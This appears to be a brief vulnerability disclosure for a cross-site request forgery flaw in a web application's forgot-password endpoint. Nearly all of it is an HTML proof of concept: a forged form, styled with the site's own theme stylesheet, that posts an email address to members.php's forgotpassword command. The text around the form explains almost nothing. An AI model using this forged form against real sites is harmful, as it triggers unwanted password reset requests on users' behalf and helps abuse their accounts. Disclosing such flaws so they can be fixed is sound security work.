# Forgot Password CSRF
Allows to request a password reset through CSRF.

## PoC:
```html
<link href="http://localhost/public/themes/Sand/assets/css/sand.css" rel="stylesheet">

<form action="http://localhost/members.php/cmd/forgotpassword" method="POST" id="LAYER_form" style="padding: 25px;">
    <label for="email">Email</label>
    <input type="text" name="email" id="email" class="form-control">
    <br><br>
    <input type="submit" name="forget" value="Send Email" class="btn btn-default">
</form>
```
